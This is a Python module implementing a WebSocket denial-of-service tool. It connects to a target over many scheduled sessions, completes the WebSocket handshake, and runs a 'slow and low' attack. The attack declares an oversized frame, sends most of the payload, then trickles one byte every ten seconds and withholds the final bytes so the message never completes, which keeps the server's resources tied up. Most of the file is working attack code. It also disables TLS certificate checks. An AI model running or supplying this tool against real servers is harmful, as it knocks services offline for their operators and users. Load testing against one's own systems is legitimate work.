#!/usr/bin/env python3

import logging
import os
import random
import asyncio
import ssl

from .websocket_protocol import (
    WSMessageType,
    WebSocketClientHandshake,
    WebSocketFrameHeader,
    websocket_mask,
    pack_2bytes,
    pack_8bytes,
    unpack_2bytes,
    unpack_8bytes)


async def _connect(host, port, use_tls, index):
    if use_tls:
        context = ssl.create_default_context()
        context.check_hostname = False
        context.verify_mode = ssl.CERT_NONE
    else:
        context = None

    try:
        future = asyncio.open_connection(host, port, ssl=context)
        reader, writer = await asyncio.wait_for(future, timeout=10)
        logging.info(f'{index}: success connect to {host}:{port}')
        return reader, writer

    # except (asyncio.TimeoutError, ConnectionRefusedError) as e:
    except Exception as e:
        logging.error(f'{index}: failed connect to {host}:{port}')
        raise


async def _send_message(writer, data, opcode):
    msg_len = len(data)

    frame = WebSocketFrameHeader(opcode=opcode, length=msg_len)

    header = frame.tobytes()

    if msg_len < WebSocketFrameHeader.LENGTH_BOUNDARY_1:
        header += b''
    elif msg_len < WebSocketFrameHeader.LENGTH_BOUNDARY_2:
        header += pack_2bytes(msg_len)
    else:
        header += pack_8bytes(msg_len)

    masking_key = os.urandom(4)

    data = websocket_mask(masking_key, data)

    writer.write(header+masking_key+data)


async def _receive_message(reader):
    header = await reader.readexactly(2)
    frame = WebSocketFrameHeader()
    frame.frombytes(header)

    if frame.mask:
        raise Exception('should not mask on server side')

    if frame.length == WebSocketFrameHeader.LENGTH_MARK_1:
        msg_len = unpack_2bytes(await reader.readexactly(2))
    elif frame.length == WebSocketFrameHeader.LENGTH_MARK_2:
        msg_len = unpack_8bytes(await reader.readexactly(8))
    else:
        msg_len = frame.length

    data = await reader.readexactly(msg_len)
    logging.debug(f'received opcode {frame.opcode}')
    logging.debug(f'received length {msg_len}')
    if msg_len < 100:
        logging.debug(f'received data {data}')

    if frame.opcode == WebSocketFrameHeader.OPCODE_CLOSE and msg_len == 2:
        logging.info(f'received close reason {unpack_2bytes(data)}')


async def _close_websocket(writer):
    data = pack_2bytes(WebSocketFrameHeader.CLOSE_OK)
    await _send_message(writer, data, WebSocketFrameHeader.OPCODE_CLOSE)


async def _handshake(reader, writer, host, port, path):
    ws = WebSocketClientHandshake(host, port, path)

    request_str = ws.send_handshake_request()
    writer.write(request_str)

    data = await reader.read(10240)
    ws.receive_handshake_response(data)


async def _slow_and_low(writer, total_length, message_type, index):
    """
    Send a big chunk first, then send small data at slow speed.
    """

    if total_length < 10000:
        raise Exception('Can not attack with less than 10K size of data.')

    msg_len = total_length

    if message_type == WSMessageType.TEXT:
        opcode = WebSocketFrameHeader.OPCODE_TEXT
    else:
        opcode = WebSocketFrameHeader.OPCODE_BINARY

    frame = WebSocketFrameHeader(opcode=opcode, length=msg_len)
    header = frame.tobytes()

    if msg_len < WebSocketFrameHeader.LENGTH_BOUNDARY_1:
        header += b''
    elif msg_len < WebSocketFrameHeader.LENGTH_BOUNDARY_2:
        header += pack_2bytes(msg_len)
    else:
        header += pack_8bytes(msg_len)

    writer.write(header)

    logging.info(f'{index}: start slow and low attack...')

    # did not found a way to detect whether the connection is closed or not...
    size_sent = 0
    for _i in range(msg_len):
        pkt_len = random.randint(1000, 1400)
        data = os.urandom(pkt_len)
        writer.write(data)
        await writer.drain()

        size_sent += pkt_len
        if size_sent > total_length - 10000:
            break

    logging.info(f'{index}: sent data size {size_sent}')

    # don't send the last 10 bytes, so the message will never be delivered
    slow_round = msg_len - size_sent - 10
    logging.info(f'{index}: send 1 byte every 10 second to keep alive for {slow_round} round')

    for _i in range(slow_round):
        logging.debug(f'{index}: send 1 byte and sleep...')
        data = os.urandom(1)
        writer.write(data)
        await asyncio.sleep(10)


async def _read_and_discard(reader):
    _data = await reader.read(1024)
    while _data:
        _data = await reader.read(1024)
        # logging.debug(_data)


async def _attack(host, port, path, length, message_type, use_tls, index):
    reader, writer = await _connect(host, port, use_tls, index)
    await _handshake(reader, writer, host, port, path)

    asyncio.ensure_future(_read_and_discard(reader))
    await _slow_and_low(writer, length, message_type, index)


async def _test(host, port, path, length, message_type, use_tls):
    reader, writer = await _connect(host, port, use_tls, 0)
    await _handshake(reader, writer, host, port, path)

    if message_type == WSMessageType.TEXT:
        opcode = WebSocketFrameHeader.OPCODE_TEXT
        data = os.urandom(length//2+1).hex()[:length].encode('ascii')
    else:
        opcode = WebSocketFrameHeader.OPCODE_BINARY
        data = os.urandom(length)

    logging.info(f'sent length {len(data)}')
    if length < 100:
        logging.debug(f'sent data {data}')

    await _send_message(writer, data, opcode)
    await _receive_message(reader)
    await _close_websocket(writer)


async def _schedule(host, port, path, length, session, message_type, use_tls, rate):

    for i in range(session):
        attack_task = _attack(host, port, path, length, message_type, use_tls, i)
        asyncio.ensure_future(attack_task)
        await asyncio.sleep(1/rate)


def attack(host, port, path, length, session, message_type=WSMessageType.TEXT, use_tls=False, rate=10):
    """
    Send flood messages with specified length.
    """

    loop = asyncio.get_event_loop()

    attack_task = _schedule(host, port, path, length, session, message_type, use_tls, rate)
    asyncio.ensure_future(attack_task)

    loop.run_forever()
